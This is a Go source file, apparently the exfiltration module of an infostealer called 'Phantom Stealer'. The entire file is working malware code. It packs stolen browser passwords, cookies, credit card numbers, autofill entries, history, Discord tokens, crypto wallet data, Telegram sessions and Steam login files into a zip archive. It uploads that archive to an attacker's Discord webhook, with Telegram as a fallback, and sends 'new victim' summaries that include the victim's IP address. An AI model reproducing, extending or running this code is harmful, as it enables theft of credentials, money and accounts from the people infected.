package exfil

/*
	Data exfiltration module

	Sends stolen data to Discord/Telegram
	Data is zipped and sent as an attachment

	Discord is primary (more reliable)
	Telegram is backup (rate limits suck)

	TODO: add custom HTTP server support
	TODO: add encryption for transit
*/

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"phantom/browsers"
	"phantom/config"
	"phantom/recon"
	"phantom/tokens"
	"phantom/wallets"
	"strings"
	"time"
)

// StealerData - contains all collected information
type StealerData struct {
	SystemInfo *recon.SystemInfo     `json:"system_info"`
	Browsers   *browsers.BrowserData `json:"browsers"`
	Wallets    *wallets.WalletData   `json:"wallets"`
	Tokens     *tokens.TokenData     `json:"tokens"`
	Files      []recon.GrabbedFile   `json:"files"`
	Timestamp  time.Time             `json:"timestamp"`
	BuildID    string                `json:"build_id"`
}

// Discord webhook types
// These match Discord's embed format
type DiscordEmbed struct {
	Title       string       `json:"title"`
	Description string       `json:"description"`
	Color       int          `json:"color"`
	Fields      []EmbedField `json:"fields"`
	Thumbnail   *EmbedThumb  `json:"thumbnail,omitempty"`
	Footer      *EmbedFooter `json:"footer,omitempty"`
	Timestamp   string       `json:"timestamp,omitempty"`
}

type EmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline"`
}

type EmbedThumb struct {
	URL string `json:"url"`
}

type EmbedFooter struct {
	Text string `json:"text"`
}

type DiscordMessage struct {
	Content  string         `json:"content,omitempty"`
	Username string         `json:"username"`
	Embeds   []DiscordEmbed `json:"embeds"`
}

// Exfiltrate - sends all stolen data to configured C2
// tries discord first, falls back to telegram
func Exfiltrate(data *StealerData) error {
	// compress everything into a zip
	zipData, err := createArchive(data)
	if err != nil {
		return err // shouldn't happen but w/e
	}

	// try discord first - more reliable
	webhook := config.DiscordWebhook
	if webhook != "" && webhook != "DISCORD_WEBHOOK_HERE" {
		err = sendToDiscord(webhook, data, zipData)
		if err == nil {
			return nil // success, we're done
		}
		// discord failed, try telegram
	}

	// fallback to telegram
	token := config.TelegramToken
	chatID := config.TelegramChatID
	if token != "" && token != "TELEGRAM_TOKEN_HERE" && chatID != "" {
		err = sendToTelegram(token, chatID, data, zipData)
		if err == nil {
			return nil
		}
	}

	return fmt.Errorf("all exfil methods failed") // rip
}

// createArchive - zips all the data
// organized into folders for easy browsing
func createArchive(data *StealerData) ([]byte, error) {
	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)

	// system info as JSON
	if data.SystemInfo != nil {
		sysJSON, _ := json.MarshalIndent(data.SystemInfo, "", "  ")
		addToZip(zw, "system_info.json", sysJSON)

		// include screenshot if we got one
		if data.SystemInfo.Screenshot != nil {
			addToZip(zw, "screenshot.png", data.SystemInfo.Screenshot)
		}
	}

	// passwords
	if data.Browsers != nil && len(data.Browsers.Passwords) > 0 {
		var passTxt strings.Builder
		for _, p := range data.Browsers.Passwords {
			passTxt.WriteString(fmt.Sprintf("URL: %s\nUsername: %s\nPassword: %s\nBrowser: %s\n\n", p.URL, p.Username, p.Password, p.Browser))
		}
		addToZip(zw, "passwords.txt", []byte(passTxt.String()))
	}

	// cookies
	if data.Browsers != nil && len(data.Browsers.Cookies) > 0 {
		var cookieTxt strings.Builder
		for _, c := range data.Browsers.Cookies {
			cookieTxt.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%v\t%s\t%s\n", c.Host, c.IsHTTPOnly, c.Path, c.IsSecure, c.Expires, c.Name, c.Value))
		}
		addToZip(zw, "cookies.txt", []byte(cookieTxt.String()))
	}

	// credit cards
	if data.Browsers != nil && len(data.Browsers.CreditCards) > 0 {
		var ccTxt strings.Builder
		for _, cc := range data.Browsers.CreditCards {
			ccTxt.WriteString(fmt.Sprintf("Name: %s\nNumber: %s\nExpiry: %s/%s\nBrowser: %s\n\n", cc.Name, cc.Number, cc.ExpMonth, cc.ExpYear, cc.Browser))
		}
		addToZip(zw, "credit_cards.txt", []byte(ccTxt.String()))
	}

	// autofill
	if data.Browsers != nil && len(data.Browsers.Autofill) > 0 {
		var autoTxt strings.Builder
		for _, a := range data.Browsers.Autofill {
			autoTxt.WriteString(fmt.Sprintf("%s: %s (%s)\n", a.Name, a.Value, a.Browser))
		}
		addToZip(zw, "autofill.txt", []byte(autoTxt.String()))
	}

	// history
	if data.Browsers != nil && len(data.Browsers.History) > 0 {
		var histTxt strings.Builder
		for _, h := range data.Browsers.History {
			histTxt.WriteString(fmt.Sprintf("[%d visits] %s - %s (%s)\n", h.VisitCount, h.URL, h.Title, h.Browser))
		}
		addToZip(zw, "history.txt", []byte(histTxt.String()))
	}

	// discord tokens
	if data.Tokens != nil && len(data.Tokens.Tokens) > 0 {
		var tokenTxt strings.Builder
		for _, t := range data.Tokens.Tokens {
			tokenTxt.WriteString(fmt.Sprintf("Token: %s\nPath: %s\n\n", t.Token, t.Path))
		}
		addToZip(zw, "discord_tokens.txt", []byte(tokenTxt.String()))
	}

	// wallets - desktop
	if data.Wallets != nil {
		for _, w := range data.Wallets.Wallets {
			walletDir := "wallets/" + w.Name + "/"
			for _, f := range w.Files {
				addToZip(zw, walletDir+f.Name, f.Content)
			}
		}

		// wallets - extensions
		for _, ext := range data.Wallets.Extensions {
			extDir := "wallets/extensions/" + ext.Browser + "_" + ext.Name + "/"
			addToZip(zw, extDir+"data.bin", ext.Data)
		}
	}

	// telegram sessions
	if data.Tokens != nil && len(data.Tokens.TelegramSessions) > 0 {
		for i, session := range data.Tokens.TelegramSessions {
			for j, file := range session.Files {
				addToZip(zw, fmt.Sprintf("telegram/session_%d_file_%d.bin", i, j), file)
			}
		}
	}

	// steam
	if data.Tokens != nil && data.Tokens.SteamData != nil {
		for i, ssfn := range data.Tokens.SteamData.SSFN {
			addToZip(zw, fmt.Sprintf("steam/ssfn_%d", i), ssfn)
		}
		if data.Tokens.SteamData.ConfigVDF != nil {
			addToZip(zw, "steam/config.vdf", data.Tokens.SteamData.ConfigVDF)
		}
		if data.Tokens.SteamData.LoginVDF != nil {
			addToZip(zw, "steam/loginusers.vdf", data.Tokens.SteamData.LoginVDF)
		}
	}

	// grabbed files
	for _, f := range data.Files {
		addToZip(zw, "grabbed_files/"+f.Path, f.Content)
	}

	zw.Close()
	return buf.Bytes(), nil
}

func addToZip(zw *zip.Writer, name string, content []byte) error {
	w, err := zw.Create(name)
	if err != nil {
		return err
	}
	_, err = w.Write(content)
	return err
}

func sendToDiscord(webhook string, data *StealerData, zipData []byte) error {
	// send summary embed first
	embed := buildSummaryEmbed(data)
	msg := DiscordMessage{
		Username: "Phantom Stealer",
		Embeds:   []DiscordEmbed{embed},
	}

	msgJSON, _ := json.Marshal(msg)
	_, err := http.Post(webhook, "application/json", bytes.NewReader(msgJSON))
	if err != nil {
		return err
	}

	// send zip file
	filename := fmt.Sprintf("%s_%s.zip", data.SystemInfo.ComputerName, time.Now().Format("2006-01-02_15-04-05"))
	return uploadToDiscord(webhook, filename, zipData)
}

func buildSummaryEmbed(data *StealerData) DiscordEmbed {
	fields := []EmbedField{}

	// system info
	if data.SystemInfo != nil {
		fields = append(fields, EmbedField{
			Name:   "Computer",
			Value:  fmt.Sprintf("```%s\\%s```", data.SystemInfo.ComputerName, data.SystemInfo.Username),
			Inline: true,
		})
		fields = append(fields, EmbedField{
			Name:   "IP",
			Value:  fmt.Sprintf("```%s```", data.SystemInfo.PublicIP),
			Inline: true,
		})
		fields = append(fields, EmbedField{
			Name:   "OS",
			Value:  fmt.Sprintf("```%s %s```", data.SystemInfo.OS, data.SystemInfo.Architecture),
			Inline: true,
		})
	}

	// counts
	if data.Browsers != nil {
		fields = append(fields, EmbedField{
			Name:   "Passwords",
			Value:  fmt.Sprintf("```%d```", len(data.Browsers.Passwords)),
			Inline: true,
		})
		fields = append(fields, EmbedField{
			Name:   "Cookies",
			Value:  fmt.Sprintf("```%d```", len(data.Browsers.Cookies)),
			Inline: true,
		})
		fields = append(fields, EmbedField{
			Name:   "Credit Cards",
			Value:  fmt.Sprintf("```%d```", len(data.Browsers.CreditCards)),
			Inline: true,
		})
	}

	if data.Tokens != nil {
		fields = append(fields, EmbedField{
			Name:   "Discord Tokens",
			Value:  fmt.Sprintf("```%d```", len(data.Tokens.Tokens)),
			Inline: true,
		})
	}

	if data.Wallets != nil {
		walletCount := len(data.Wallets.Wallets) + len(data.Wallets.Extensions)
		fields = append(fields, EmbedField{
			Name:   "Crypto Wallets",
			Value:  fmt.Sprintf("```%d```", walletCount),
			Inline: true,
		})
	}

	// antivirus
	if data.SystemInfo != nil && len(data.SystemInfo.AntiVirus) > 0 {
		avList := strings.Join(data.SystemInfo.AntiVirus, ", ")
		if len(avList) > 100 {
			avList = avList[:100] + "..."
		}
		fields = append(fields, EmbedField{
			Name:   "Antivirus",
			Value:  fmt.Sprintf("```%s```", avList),
			Inline: false,
		})
	}

	return DiscordEmbed{
		Title:       "New Victim pwned!",
		Description: "Data successfully exfiltrated",
		Color:       0x7289DA, // discord blurple
		Fields:      fields,
		Timestamp:   time.Now().Format(time.RFC3339),
		Footer: &EmbedFooter{
			Text: "Phantom Stealer | " + config.BuildID,
		},
	}
}

func uploadToDiscord(webhook string, filename string, data []byte) error {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filename)
	if err != nil {
		return err
	}

	_, err = io.Copy(part, bytes.NewReader(data))
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", webhook, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("discord upload failed: %d", resp.StatusCode)
	}

	return nil
}

func sendToTelegram(token, chatID string, data *StealerData, zipData []byte) error {
	// send summary message
	summary := buildTelegramSummary(data)
	sendTelegramMessage(token, chatID, summary)

	// send zip file
	filename := fmt.Sprintf("%s_%s.zip", data.SystemInfo.ComputerName, time.Now().Format("2006-01-02_15-04-05"))
	return sendTelegramDocument(token, chatID, filename, zipData)
}

func buildTelegramSummary(data *StealerData) string {
	var sb strings.Builder

	sb.WriteString("**NEW VICTIM**\n\n")

	if data.SystemInfo != nil {
		sb.WriteString(fmt.Sprintf("Computer: `%s\\%s`\n", data.SystemInfo.ComputerName, data.SystemInfo.Username))
		sb.WriteString(fmt.Sprintf("IP: `%s`\n", data.SystemInfo.PublicIP))
		sb.WriteString(fmt.Sprintf("OS: `%s %s`\n", data.SystemInfo.OS, data.SystemInfo.Architecture))
		sb.WriteString(fmt.Sprintf("RAM: `%s`\n", data.SystemInfo.RAM))
		sb.WriteString(fmt.Sprintf("Uptime: `%s`\n\n", data.SystemInfo.Uptime))
	}

	if data.Browsers != nil {
		sb.WriteString(fmt.Sprintf("Passwords: `%d`\n", len(data.Browsers.Passwords)))
		sb.WriteString(fmt.Sprintf("Cookies: `%d`\n", len(data.Browsers.Cookies)))
		sb.WriteString(fmt.Sprintf("Credit Cards: `%d`\n", len(data.Browsers.CreditCards)))
	}

	if data.Tokens != nil {
		sb.WriteString(fmt.Sprintf("Discord Tokens: `%d`\n", len(data.Tokens.Tokens)))
	}

	if data.Wallets != nil {
		walletCount := len(data.Wallets.Wallets) + len(data.Wallets.Extensions)
		sb.WriteString(fmt.Sprintf("Crypto Wallets: `%d`\n", walletCount))
	}

	return sb.String()
}

func sendTelegramMessage(token, chatID, text string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)

	payload := map[string]string{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "Markdown",
	}

	payloadJSON, _ := json.Marshal(payload)
	_, err := http.Post(url, "application/json", bytes.NewReader(payloadJSON))
	return err
}

func sendTelegramDocument(token, chatID, filename string, data []byte) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}

	_, err = io.Copy(part, bytes.NewReader(data))
	if err != nil {
		return err
	}

	writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("telegram upload failed: %d", resp.StatusCode)
	}

	return nil
}

// helper for temporary file
func tempFile(data []byte, ext string) (string, error) {
	f, err := os.CreateTemp("", "*"+ext)
	if err != nil {
		return "", err
	}
	defer f.Close()

	_, err = f.Write(data)
	if err != nil {
		return "", err
	}

	return f.Name(), nil
}
